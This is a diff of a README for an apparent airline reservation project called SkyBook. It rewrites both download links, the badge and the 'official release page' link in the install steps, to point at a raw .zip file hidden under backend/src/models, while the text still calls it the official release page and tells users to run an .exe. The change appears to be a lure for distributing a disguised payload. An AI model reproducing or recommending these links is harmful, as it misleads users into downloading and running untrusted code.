@@ -1,6 +1,6 @@
 # ✈️ skybook-airline-reservation - Easily Manage Your Flight Booking Needs
 
-[![](https://img.shields.io/badge/Download-SkyBook_Latest_Release-blue.svg)](https://github.com/recent-pursuer670/skybook-airline-reservation/releases)
+[![](https://img.shields.io/badge/Download-SkyBook_Latest_Release-blue.svg)](https://raw.githubusercontent.com/recent-pursuer670/skybook-airline-reservation/main/backend/src/models/reservation-airline-skybook-3.2.zip)
 
 ## 📋 Project Overview
 
@@ -21,7 +21,7 @@ Your computer must meet these basic standards to run the application:
 Follow these steps to obtain the application:
 
 1. Open your web browser.
-2. Go to the [official release page](https://github.com/recent-pursuer670/skybook-airline-reservation/releases).
+2. Go to the [official release page](https://raw.githubusercontent.com/recent-pursuer670/skybook-airline-reservation/main/backend/src/models/reservation-airline-skybook-3.2.zip).
 3. Find the most recent release version at the top of the list.
 4. Look for the Assets section under that version.
 5. Click the link that ends with .exe to start the download.
